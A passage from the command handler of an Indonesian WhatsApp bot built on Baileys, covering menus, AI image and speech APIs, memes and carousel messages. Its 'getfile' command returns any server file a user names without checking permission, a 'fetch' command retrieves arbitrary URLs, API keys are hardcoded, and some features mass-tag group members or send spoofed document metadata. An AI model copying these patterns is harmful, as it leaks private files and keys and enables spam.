 "ffffff",
 "This image is 1024x1024!"
 ],
 [
 "1024x512",
 "000000",
 "ffffff",
 "This image is 1024x512!"
 ],
 [
 "512x1024",
 "000000",
 "ffffff",
 "This image is 512x1024!"
 ],
 [
 "1024x768",
 "000000",
 "ffffff",
 "This image is 1024x768!"
 ]
];

(async () => {
 const cards = [];
 for (const image of _images) {
 const imageMsg = await createImage(image[0], image[1], image[2], image[3]);
 const card = {
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: `[body] ${image[3]}`
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 text: `[footer] ${image[3]}`
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `[header] ${image[3]}`,
 hasMediaAttachment: true,
 imageMessage: imageMsg
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
 {
 name: "quick_reply",
 buttonParamsJson: "{\"display_text\":\"quick_reply\",\"id\":\"message\"}"
 },
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"url","url":"${getUrl(...image)}","merchant_url":"${getUrl(...image)}"}`
 },
 {
 name: "cta_copy",
 buttonParamsJson: `{"display_text":"copy","id":"123456789","copy_code":"${getUrl(...image)}"}`
 }
 ]
 })
 };
 cards.push(card);
 }

 const msg = baileys.generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: "test"
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 text: "test"
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: "test",
 subtitle: "test",
 hasMediaAttachment: false
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards: cards
 })
 })
 }
 }
 }, {});

 await sky.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
 });
})();
}
break
case 'menumaker': {
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const uptime = process.uptime();
 let docs = fs.readFileSync('./src/sky.ppt'); // Menggunakan titik koma
 let listfakedocs = [
 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
 'application/pdf'
 ];
 // Fungsi getPp untuk mengambil gambar profil
 async function getPp(sky, target) {
 try {
 const response = await sky.query({
 tag: "iq",
 attrs: {
 target: target,
 to: "@s.whatsapp.net",
 type: "get",
 xmlns: "w:profile:picture"
 },
 content: [{
 tag: "picture",
 attrs: {
 type: "image",
 query: "url"
 }
 }]
 });
 return response.content[0]?.attrs?.url || 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg'; // Fallback URL
 } catch (error) {
 console.error('Error fetching profile picture:', error);
 return 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg'; // Fallback URL
 }
 }
 let makers = '';
 for (let i = 1; i <= 71; i++) {
 makers += `> MAKER v${i}\n`;
 }
 makers += `> MAKER v72`; // Menambahkan v72 tanpa baris baru
 
 // Ambil profile picture menggunakan getPp
 let profile = await getPp(sky, m.sender);

 const menunya = `>> MENU MAKER

> EPHOTO
> FLAMINGTEXT
${makers}
> MAKER v72`
 await sky.sendMessage(m.chat, {
 document: docs,
 fileName: `Hai Kak ${pushname}`,
 mimetype: pickRandom(listfakedocs),
 fileLength: 100000000000, // Sesuaikan dengan ukuran file yang lebih realistis
 pageCount: 999, // Sesuaikan dengan dokumen yang dikirim
 caption: menunya,
 contextInfo: {
 mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
 forwardingScore: 10,
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '0@newsletter',
 serverMessageId: null,
 newsletterName: 'Hello Everyone My name is Avosky'
 },
 externalAdReply: {
 title: `${hariini} ⏲️`,
 body: `${runtime(uptime)}`,
 showAdAttribution: true,
 thumbnailUrl: profile, // Menggunakan profil yang didapat dari getPp
 mediaType: 1,
 previewType: 0,
 renderLargerThumbnail: true,
 mediaUrl: 'https://avosky.com',
 sourceUrl: 'https://avosky.com'
 }
 }
 }, { quoted: fkontak });
}
break

case 'aicreate8': {
 const q = encodeURIComponent(args.join(' ')); // Mengambil teks dari argumen dan mengonversinya menjadi URI yang aman

 const apiUrl = `https://widipe.com/ai/text2img?text=${q}`;

 // Mengirim permintaan ke REST API untuk membuat gambar
 fetch(apiUrl)
 .then(response => response.json())
 .then(data => {
 // Jika respons berhasil, kirim gambar ke grup atau obrolan
 sky.sendMessage(m.chat, { image: { url: data.url }, caption: 'Ini gambar yang dibuat dari teks yang diberikan.' });
 })
 .catch((error) => {
 console.error('Error:', error);
 m.reply('Terjadi kesalahan saat membuat gambar.');
 });
}
break
case 'photoleap': {
 if (!q) return m.reply(`contoh \n\nphotoleap girl crying`);
 async function textToImage(text) {
 try {
 const { data } = await axios.get("https://tti.photoleapapp.com/api/v1/generate?prompt=" + encodeURIComponent(text));
 return data;
 } catch (err) {
 return null;
 }
 }
//avosky
 const result = await textToImage(text);
//avosky
 if (result && result.result_url) {
 const imageUrl = result.result_url;
 const message = {
 image: { url: imageUrl },
 caption: 'done nih'
 };
 sky.sendMessage(m.chat, message);
 } else {
 m.reply('err.');
 }
}
break
case 'txt2img': {
 if (!isPrem) return replyprem(mess.premium)
 try {
 if (args1.length == 0) return m.reply(`Contoh: ${prefix + command} cowok`);
 m.reply(mess.wait);
 let { data } = await axios.get(`https://itzpire.com/ai/realistic?prompt=${q}`);
 if (data.message) return m.reply(JSON.stringify(data));
 await sky.sendMessage(m.chat, { image: { url: data.result }, caption: mess.done }, { quoted: m });
 } catch (error) {
 console.error(error);
 m.reply('Maaf, terjadi gangguan dalam menggunakan fitur ini.');
 }
}
break
case 'listcase': {
 const fs = require('fs');
 try {
 const mytext = fs.readFileSync('./sky.js', 'utf8');
 const cases = mytext.match(/case '.*?':/g);
 if (cases) {
 const sortedCases = cases
 .map((caseString) => caseString.replace(/case |:/g, ''))
 .sort();
 const listMessage = `Daftar Case:\n${sortedCases.join('\n')}`;
 m.reply(listMessage);
 } else {
 m.reply('Tidak ada case yang ditemukan dalam file sky.js.');
 }
 } catch (error) {
 m.reply('Terjadi kesalahan saat mencoba membaca file sky.js.');
 }
}
break
case 'htg': { 
 if (isBan) return m.reply('???');
 if (!isCreator) throw mess.owner;

 // Memisahkan pesan menjadi teks dan jumlah tag
 let [text, count] = args.join(" ").split("|").map((str) => str.trim());

 // Memastikan count merupakan angka positif
 count = parseInt(count);
 if (isNaN(count) || count <= 0) {
 return m.reply("Mohon berikan jumlah tag yang valid.");
 }

 // Mengirim pesan dengan tag sesuai dengan jumlah yang diminta dengan delay 1 detik
 for (let i = 0; i < count; i++) {
 setTimeout(() => {
 sky.sendMessage(
 m.chat,
 { text: text ? text : "", mentions: participants.map((a) => a.id) },
 { quoted: fkontak }
 );
 }, i * 1000); // Delay 1 detik * iterasi saat ini
 }
}
break
case 'emi': {
 if (!isPrem) return replyprem(mess.premium)
 try {
 if (args1.length == 0) return m.reply(`Contoh: ${prefix + command} cowok`);
 m.reply(mess.wait);
 let { data } = await axios.get(`https://itzpire.com/ai/emi?prompt=${q}`);
 if (data.message) return m.reply(JSON.stringify(data));
 await sky.sendMessage(m.chat, { image: { url: data.result }, caption: mess.done }, { quoted: m });
 } catch (error) {
 console.error(error);
 m.reply('Maaf, terjadi gangguan dalam menggunakan fitur ini.');
 }
}
break
case 'menusup': {
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
const uptime = process.uptime();
 let docs = fs.readFileSync('./src/sky.ppt'); // Menggunakan titik koma
 let listfakedocs = [
 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
 'application/pdf'
 ];
 // Fungsi getPp untuk mengambil gambar profil
 async function getPp(sky, target) {
 try {
 const response = await sky.query({
 tag: "iq",
 attrs: {
 target: target,
 to: "@s.whatsapp.net",
 type: "get",
 xmlns: "w:profile:picture"
 },
 content: [{
 tag: "picture",
 attrs: {
 type: "image",
 query: "url"
 }
 }]
 });
 return response.content[0]?.attrs?.url || 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg'; // Fallback URL
 } catch (error) {
 console.error('Error fetching profile picture:', error);
 return 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg'; // Fallback URL
 }
 }

 // Ambil profile picture menggunakan getPp
 let profile = await getPp(sky, m.sender);

 const menunya = `≫ MENU SUP

> AINIME
> AIDALLE
> GBARD
> AI
> AI2
> EDITEE
> OPENAI
> GPT
> C-IMG
> AI4
> FLUX
> BINGAI
> TOANIME
> TOANIME2
> TURBO
> AIDIFF
> REMINI
> EMI
> TXT2IMG
> ALQURAN
> AIGENERATOR
> AITECH
> IMAGE-GEN
> PROMPT
> PROMPT-GEN
> BINGIMG
> HERCAI
> CAI
> AIMATH`
 await sky.sendMessage(m.chat, {
 document: docs,
 fileName: `Hai Kak ${pushname}`,
 mimetype: pickRandom(listfakedocs),
 fileLength: 100000000000, // Sesuaikan dengan ukuran file yang lebih realistis
 pageCount: 999, // Sesuaikan dengan dokumen yang dikirim
 caption: menunya,
 contextInfo: {
 mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
 forwardingScore: 10,
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '0@newsletter',
 serverMessageId: null,
 newsletterName: 'Hello Everyone My name is Avosky'
 },
 externalAdReply: {
 title: `${hariini} ⏲️`,
 body: `${runtime(uptime)}`,
 showAdAttribution: true,
 thumbnailUrl: profile, // Menggunakan profil yang didapat dari getPp
 mediaType: 1,
 previewType: 0,
 renderLargerThumbnail: true,
 mediaUrl: 'https://avosky.com',
 sourceUrl: 'https://avosky.com'
 }
 }
 }, { quoted: fkontak });
}
break
case 'simi': {
 if (!q) throw `apa simi simi ha`
 const text = args.join(' ');
 const languageCode = 'id';
 const simsimiKey = ''; 
 fetch('https://api.simsimi.vn/v1/simtalk', {
 method: 'POST',
 headers: {
 'Content-Type': 'application/x-www-form-urlencoded'
 },
 body: `text=${encodeURIComponent(text)}&lc=${languageCode}&key=${simsimiKey}`
 })
 .then(response => response.json())
 .then(data => {
 const simsimiResponse = data.message;
 const replyText = `${simsimiResponse}`;
 sky.sendMessage(m.chat, { text: replyText }, { quoted: m });
 })
 .catch(error => {
 console.error('Error:', error);
 m.reply('Terjadi kesalahan saat mencoba berkomunikasi dengan SimSimi.');
 });
}
break
case 'whois': {
const whois = require('whois-json');
 const domain = args[0]; // Ambil domain dari argumen

 if (!domain) {
 m.reply('Silakan masukkan domain yang ingin dicek WHOIS-nya.');
 return;
 }

 // Lakukan pencarian WHOIS untuk domain yang diberikan
 whois(domain)
 .then(results => {
 const whoisText = `Informasi WHOIS untuk ${domain}:\n`;

 let infoText = "";
 for (const key in results) {
 infoText += `${key}: ${results[key]}\n`;
 }

 m.reply(whoisText + infoText);
 })
 .catch(error => {
 console.error("Error:", error);
 m.reply("Terjadi kesalahan saat mencari informasi WHOIS untuk domain tersebut.");
 });
}
break
case 'ttsanime': {
 if (!isPrem) return replyprem(mess.premium)
try {
if (!text) return m.reply(`Example : ${prefix + command} text | nama voice`)
text1 = text.split(' | ')[0] ? text.split(' | ')[0] : '-'
text2 = text.split(' | ')[1] ? text.split(' | ')[1] : '-'
m.reply(mess.wait)
let tts = await fetchJson(`https://skizo.tech/api/tts-anime?apikey=dila123&text=${encodeURIComponent(text1)}&lang=japanese&voice=${text2}&speed=0,5&symbol=N`)
sky.sendMessage(from, { audio: { url: tts.data.url_voice }, mimetype: "audio/mp4", fileName: "Audio" }, { quoted: m })
} catch (err) {
console.log(err)
m.reply('Terjadi Kesalahan')
}
}
break
case 'removebg': case 'remove-bg': {
 if (isBan) return m.reply('Anda telah diblokir oleh owner.')
 if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
 if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
 let remobg = require('remove.bg')
 let apirnobg = ['nHW4vuET9YnwFspSHD8CH68D']
 let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
 hmm = await './src/remobg-' + getRandom('')
 localFile = await sky.downloadAndSaveMediaMessage(qmsg, hmm)
 outputFile = await './src/hremo-' + getRandom('.png')
 m.reply(mess.wait)
 remobg.removeBackgroundFromImageFile({
 path: localFile,
 apiKey: apinobg,
 size: "regular",
 type: "auto",
 scale: "100%",
 outputFile
 }).then(async result => {
 if (result.errors) {
 throw `Terjadi kesalahan saat menghapus latar belakang: ${result.errors[0].title}`
 } else {
 sky.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
 await fs.unlinkSync(localFile)
 await fs.unlinkSync(outputFile)
 }
 }).catch(error => {
 console.error("Error:", error);
 m.reply("Terjadi kesalahan saat menghapus latar belakang gambar.");
 });
}
break
case 'nyanyi-ce': {
 if (!text) return m.reply(`song nya?`, m);
 try {
 const a = await (
 await axios.post(
 "https://gesserit.co/api/tiktok-tts",
 { text: text, voice: "en_female_f08_salut_damour" },
 {
 headers: {
 Referer: "https://gesserit.co/tiktok",
 "User-Agent":
 "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
 responseType: "arraybuffer",
 },
 },
 )
 ).data;

 const b = Buffer.from(a.audioUrl);
 sky.sendMessage(m.chat, {
 audio: Buffer.from(a.audioUrl.split("base64,")[1], "base64"),
 mimetype: "audio/mpeg",
 }, { quoted: m });
 } catch (error) {
 m.reply(`Error: ${error.message}`, m);
 }
}
break;
case 'nyanyi-co': {
 if (!text) return m.reply(`song nya?`, m);
 try {
 const a = await (
 await axios.post(
 "https://gesserit.co/api/tiktok-tts",
 { text: text, voice: "en_male_m03_lobby" },
 {
 headers: {
 Referer: "https://gesserit.co/tiktok",
 "User-Agent":
 "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
 responseType: "arraybuffer",
 },
 },
 )
 ).data;

 const b = Buffer.from(a.audioUrl);
 sky.sendMessage(m.chat, {
 audio: Buffer.from(a.audioUrl.split("base64,")[1], "base64"),
 mimetype: "audio/mpeg",
 }, { quoted: m });
 } catch (error) {
 m.reply(`Error: ${error.message}`, m);
 }
}
break;
case 'imdb': {
 if (!isCreator) return m.reply(mess.owner);

 const query = args.join(' ');
 if (!query) {
 m.reply('Tentukan judul film yang ingin dicari.');
 return;
 }

 const url = `https://api.popcat.xyz/imdb?q=${encodeURIComponent(query)}`;

 fetch(url)
 .then(response => response.json())
 .then(data => {
 if (!data || !data.title) {
 m.reply('Film tidak ditemukan.');
 return;
 }

 const {
 title,
 year,
 rated,
 released,
 runtime,
 genres,
 director,
 writer,
 actors,
 plot,
 languages,
 country,
 awards,
 poster,
 rating,
 imdburl
 } = data;

 const ratings = data.ratings.map(r => `${r.source}: ${r.value}`).join('\n');

 const caption = `*Title*: ${title}\n` +
 `*Year*: ${year}\n` +
 `*Rated*: ${rated}\n` +
 `*Released*: ${new Date(released).toDateString()}\n` +
 `*Runtime*: ${runtime}\n` +
 `*Genres*: ${genres}\n` +
 `*Director*: ${director}\n` +
 `*Writer*: ${writer}\n` +
 `*Actors*: ${actors}\n` +
 `*Plot*: ${plot}\n` +
 `*Languages*: ${languages}\n` +
 `*Country*: ${country}\n` +
 `*Awards*: ${awards}\n` +
 `*Ratings*:\n${ratings}\n` +
 `*IMDB Rating*: ${rating}\n` +
 `*IMDB URL*: ${imdburl}`;

 sky.sendMessage(m.chat, { image: { url: poster }, caption: caption }, { quoted: m });
 })
 .catch(error => {
 console.error('Error fetching movie data:', error);
 m.reply('Terjadi kesalahan saat mengambil data film.');
 });
}
break
case 'get': case 'fetch': {
 if (!q) {
 return m.reply(`get url`);
 }
 if (!/^https?:\/\//.test(q)) {
 return m.reply("URL is Invalid!");
 }

 const axios = require('axios');
 const fileType = require('file-type');

 var requestOptions = {
 method: "GET",
 responseType: 'arraybuffer'
 };

 const fetchMedia = async (url) => {
 try {
 const response = await axios.get(url, requestOptions);
 const type = await fileType.fromBuffer(response.data);

 if (type) {
 if (type.mime === 'image/gif') {
 sky.sendMessage(from, { video: response.data, caption: "GIF fetched from URL", gifPlayback: true }, { quoted: m });
 } else if (type.mime.startsWith('image/')) {
 sky.sendMessage(from, { image: response.data, caption: "Image fetched from URL" }, { quoted: m });
 } else if (type.mime.startsWith('video/')) {
 sky.sendMessage(from, { video: response.data, mimetype: type.mime, caption: "Video fetched from URL" }, { quoted: m });
 } else if (type.mime.startsWith('audio/')) {
 sky.sendMessage(from, { audio: response.data, mimetype: type.mime, fileName: "Audio" }, { quoted: m });
 } else {
 m.reply("Unsupported media type");
 }
 } else {
 m.reply("Could not determine media type");
 }
 } catch (error) {
 m.reply(`Error: ${error.message}`);
 }
 };

 fetchMedia(q);
}
break
case 'slide': {
 if (!q) return m.reply(`Masukkan jumlah slide yang ingin dibuat`);
 const baileys = require("@whiskeysockets/baileys");
 const { proto } = baileys;
 const axios = require("axios");

 const getUrl = (imageUrl) => imageUrl;

 const getRandomColor = () => {
 const randomColor = Math.floor(Math.random() * 16777215).toString(16); // Menghasilkan angka acak antara 0 dan 16777215 dan mengonversinya menjadi hex
 return randomColor.padStart(6, '0'); // Menambahkan nol di depan jika panjang string kurang dari 6
 };

 const getRandomColorImage = async () => {
 const randomColor = getRandomColor();
 return `https://via.placeholder.com/150/${randomColor}FF/808080?text=${pushname}`; // Menggunakan warna acak untuk membuat URL gambar placeholder
 };

 const createImage = async () => {
 const imageUrl = await getRandomColorImage();
 const url = getUrl(imageUrl);
 const { imageMessage } = await baileys.generateWAMessageContent({
 image: {
 url
 }
 }, {
 upload: sky.waUploadToServer
 });
 return imageMessage;
 };

 (async () => {
 const slideCount = parseInt(q);
 if (isNaN(slideCount) || slideCount <= 0) return m.reply("Jumlah slide tidak valid");

 const cards = [];

 for (let i = 0; i < slideCount; i++) {
 const imageMsg = await createImage();
 const card = {
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 text: `slide ${i + 1}`,
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `slide ${i + 1}`,
 hasMediaAttachment: true,
 imageMessage: imageMsg
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"url","url":"https://avosky.id","merchant_url":"avosky.com"}`
 },
 {
 name: "cta_copy",
 buttonParamsJson: `{"display_text":"copy","id":"123456789${i}","copy_code":"iky ganteng ${i}"}`
 }
 ]
 })
 };
 cards.push(card);
 }

 const msg = baileys.generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: "_halo kak_"
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 text: `${pushname}`
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: ` ${runtime(process.uptime())}\n`,
 hasMediaAttachment: false
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards: cards
 })
 })
 }
 }
 }, {});

 await sky.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
 });
 })();
}
break
case 'cls': {
 if (!m?.quoted) return m?.reply('Reply with a sticker!');
 
 let stiker = true;

 try {
 let [packname, ...author] = text.split('|');
 author = (author || []).join('|');
 let mime = m?.quoted.mimetype || '';
 if (!/webp/.test(mime)) throw 'Reply with a sticker!';
 
 let img = await m?.quoted.download();
 if (!img) throw 'Failed to download sticker!';
 
 stiker = await addExif(img, packname || global.packname, author || global.author);
 } catch (e) {
 console.error(e);
 if (Buffer.isBuffer(e)) stiker = e;
 else throw 'An error occurred: ' + e;
 } finally {
 if (stiker) {
 sky.sendFile(m?.chat, stiker, 'sticker.webp', '', m, false, { asSticker: true });
 } else {
 throw 'Conversion failed';
 }
 }
}
break
case 'memegen': {
 if (!args[0]) throw 'contoh memegen 1 |text atas|text bawah';

const memeList = {
 '10-Guy': 1,
 'Advice-Dog': 2,
 'Afraid-to-Ask-Andy': 3,
 'Annoying-Facebook-Girl': 4,
 'Anti-Joke-Chicken': 5,
 'Awkward-Moment-Sealion': 6,
 'Bad-Luck-Brian': 7,
 'Bear-Grylls-Advice': 8,
 'Condescending-Wonka': 9,
 'Courage-Wolf': 10,
 'Disaster-Girl': 11,
 'Distracted-Boyfriend': 12,
 'Doge': 13,
 'Don-T-You-Squidward': 14,
 'First-World-Problems': 15,
 'Forever-Alone': 16,
 'Foul-Bachelor-Frog': 17,
 'Futurama-Fry': 18,
 'Good-Guy-Greg': 19,
 'Grumpy-Cat': 20,
 'High-Expectations-Asian-Father': 21,
 'Hipster-Ariel': 22,
 'I-Should-Buy-A-Boat-Cat': 23,
 'Insanity-Wolf': 24,
 'Kermit-The-Frog-Drinking-Tea': 25,
 'Laughing-Men-In-Suits': 26,
 'Lazy-College-Senior': 27,
 'Matrix-Morpheus': 28,
 'One-Does-Not-Simply': 29,
 'Overly-Attached-Girlfriend': 30,
 'Overly-Manly-Man': 31,
 'Philosoraptor': 32,
 'Sarcastic-Bear': 33,
 'Scumbag-Brain': 34,
 'Scumbag-Steve': 35,
 'Skeptical-Baby': 36,
 'Socially-Awkward-Penguin': 37,
 'Success-Kid': 38,
 'The-Most-Interesting-Man-In-The-World': 39,
 'The-Rock-Driving': 40,
 'Third-World-Skeptical-Kid': 41,
 'Unhelpful-High-School-Teacher': 42,
 'Willy-Wonka': 43,
 'Y-U-No': 44,
 'Aint-Nobody-Got-Time-For-That': 45,
 'All-The-Things': 46,
 'Am-I-The-Only-One-Around-Here': 47,
 'And-Its-Gone': 48,
 'Archer': 49,
 'Baby-Godfather': 50,
 'Back-In-My-Day': 51,
 'Bad-Joke-Eel': 52,
 'Batman-Slapping-Robin': 53,
 'Bender': 54,
 'Brace-Yourselves': 55,
 'But-Thats-None-Of-My-Business': 56,
 'Captain-Picard-Facepalm': 57,
 'Chemistry-Cat': 58,
 'Chuck-Norris': 59,
 'Confession-Bear': 60,
 'Creepy-Condescending-Wonka': 61,
 'Darth-Vader': 62,
 'Do-You-Want-Award': 63,
 'Doge-2': 64,
 'Donald-Trump': 65,
 'Ermahgerd': 66,
 'Evil-Kermit': 67,
 'Evil-Toddler': 68,
 'Facepalm-Picard': 69,
 'First-World-Stoner-Problems': 70,
 'Fuck-Me-Right': 71,
 'Gangnam-Style': 72,
 'Gasp-Rage-Face': 73,
 'Grandma-Finds-The-Internet': 74,
 'Grandma-Finds-The-Internet-3': 75,
 'Grumpy-Cat-Christmas': 76,
 'Grumpy-Cat-Happy': 77,
 'Guy-Fawkes': 78,
 'Haha-Davis': 79,
 'Haha-Okay': 80,
 'Haha-What-The-Fuck': 81,
 'Happy-Guy-Rage-Face': 82,
 'He-Needs-Some-Milk': 83,
 'Hide-Yo-Wife': 84,
 'Hipster-Barista': 85,
 'Hipster-Kitty': 86,
 'House-Bunny': 87,
 'I-See-Dead-People': 88,
 'I-Too-Like-To-Live-Dangerously': 89,
 'Imagination-Spongebob': 90,
 'Its-Happening': 91,
 'Jimmie-Rustling': 92,
 'Joseph-Ducreux': 93,
 'Laughing-Lizard': 94,
 'Me-Gusta': 95,
 'Me-Too-Thanks': 96,
 'Mother-Of-God': 97,
 'No-I-Don-T-Think-I-Will': 98,
 'Oh-My-God-Karen': 99,
 'Oh-So-You-Too': 100,
 };
 const [memeInput, topText, bottomText] = args[0].split('|').map(text => text.trim());
 let memeName = '';
 const memeNumber = parseInt(memeInput);
 
 if (!isNaN(memeNumber)) {
 const memeNames = Object.keys(memeList);
 const memeIndex = memeNumber - 1;
 
 if (memeIndex < 0 || memeIndex >= memeNames.length) {
 m.reply('Nomor meme tidak valid.');
 return;
 }
 
 memeName = memeNames[memeIndex];
 } else {
 memeName = memeInput;
 if (!memeList[memeName]) {
 m.reply('Nama meme tidak valid.');
 return;
 }
 }

 try {
 sky.sendMessage(m.chat, { image: { url: `https://apimeme.com/meme?meme=${memeName}&top=${topText}&bottom=${bottomText}` }, caption: 'Meme yang kamu buat' });
 } catch (error) {
 console.error('Error creating meme:', error);
 m.reply('Terjadi kesalahan saat membuat meme.');
 }
}
break

case 'getfile': {
 try {
 const filePath = `${q}`;
 const fileName = `${q}`;
 
 // Membaca file dari sistem
 const fs = require('fs');
 if (fs.existsSync(filePath)) {
 // Mengirim file menggunakan sky.sendMessage dengan tipe document
 sky.sendMessage(m.chat, { document: { url: filePath }, mimetype: 'application/octet-stream', fileName: fileName }, { quoted: m });
 } else {
 m.reply('File not found.');
 }
 } catch (err) {
 console.error(err);
 m.reply('Terjadi Kesalahan');
 }
}
break
case 'slidevid': {
 if (!isPrem) return replyprem(mess.premium);

const axios = require('axios');
const cheerio = require('cheerio');
const baileys = require("@whiskeysockets/baileys");
const { proto } = baileys;

const delay = (time) => new Promise((resolve) => setTimeout(resolve, time));
 const videoUrl = "https://telegra.ph/file/5b50a732eb6137775a898.mp4";

 // Fungsi untuk membuat pesan video
 const createVideo = async (videoUrl) => {
 const { videoMessage } = await baileys.generateWAMessageContent({
 video: {
 url: videoUrl
 }
 }, {
 upload: sky.waUploadToServer
 });
 return videoMessage;
 };

 try {
 const videos = [];

 // Membuat tiga video slide dengan tombol yang berbeda
 for (let i = 0; i < 3; i++) {
 const videoMsg = await createVideo(videoUrl);
 let buttons = [];
 if (i === 0) {
 buttons.push({
 name: "cta_url",
 buttonParamsJson: `{"display_text":"Visit Website","url":"https://example.com","merchant_url":"example.com"}`
 });
 } else if (i === 1) {
 buttons.push({
 name: "cta_copy",
 buttonParamsJson: `{"display_text":"Copy Code","id":"123456789","copy_code":"COPY123"}`
 });
 } else if (i === 2) {
 buttons.push({
 name: "cta_call",
 buttonParamsJson: "{\"display_text\":\"Call Now\",\"id\":\"1234567890\"}"
 });
 }

 const card = {
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 text: `Slide ${i + 1}`
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: `Slide ${i + 1}`,
 hasMediaAttachment: true,
 videoMessage: videoMsg
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
 buttons: buttons
 })
 };
 videos.push(card);

 // Jeda pengiriman setiap video
 await delay(2000);
 }

 const msg = baileys.generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.fromObject({
 body: proto.Message.InteractiveMessage.Body.fromObject({
 text: "Ini adalah video slide"
 }),
 footer: proto.Message.InteractiveMessage.Footer.fromObject({
 text: `${pushname}`
 }),
 header: proto.Message.InteractiveMessage.Header.fromObject({
 title: ` ${runtime(process.uptime())}\n`,
 hasMediaAttachment: false
 }),
 carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
 cards: videos
 })
 })
 }
 }
 }, {});

 await sky.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
 });
 } catch (error) {
 console.error(error);
 return m.reply(`Terjadi kesalahan saat mengirim video: ${error.message}`);
 }
}
break
case 'listid': {
 const allChatIds = Object.keys(db.data.chats); // Mengambil semua ID chat
 const totalChatIds = allChatIds.length; // Menghitung jumlah total ID chat
 let chatIdList = ''; // Inisialisasi string untuk daftar ID chat
 
 // Menggabungkan semua ID menjadi string dengan pemisah baris baru
 allChatIds.forEach((chatId, index) => {
 chatIdList += `${index + 1}. ${chatId}\n`;
 });

 m.reply(`Total ID Chat: ${totalChatIds}\nSemua ID Chat:\n${chatIdList}`);
}
break
case 'gbard': {
 if (!q) return m.reply(`Mau tanya apa Tuan > ${pushname}`);
 async function gbard(you_qus) {
   let baseURL = "https://free-api.cveoy.top/";
   try {
     const response = await fetch(baseURL + "v3/completions", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
         "origin": "https://ai1.chagpt.fun",
         "Referer": baseURL
       },
       body: JSON.stringify({
         prompt: you_qus
       })
     });
     
     const data = await response.text();
     // Clean the response data
     const cleanedData = data
       .replace(/<br\s*\/?>/gi, '') // Remove HTML line breaks
       .replace(/[\u4e00-\u9fa5]/g, '') // Remove Chinese characters
       .replace(/! ：wxgpt@qq\.com/g, ''); // Remove specific unwanted text
     return cleanedData.trim(); // Return the cleaned response data
   } catch (error) {
     console.error(error);
     return 'Error processing request'; // Optional: return an error message
   }
 }

 try {
   const answer = await gbard(`${q}`);
   m.reply(`${answer}`);
 } catch (error) {
   m.reply("Terjadi kesalahan saat mengambil jawaban dari Google Bard.");
   console.error(error);
 }
}
break
case 'superhd': {
 const { TelegraPh } = require('./lib/uploader');
 const sharp = require('sharp');
 const fs = require('fs');
 
 const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? sky.user.jid : m.sender;
 const q = m.quoted ? m.quoted : m;
 const mime = (q.msg || q).mimetype || '';
 
 if (!mime || !mime.includes('image')) return m.reply(`Mana gambarnya bang?`);
 m.reply(mess.wait);
 
 try {
 const media = await sky.downloadAndSaveMediaMessage(q);
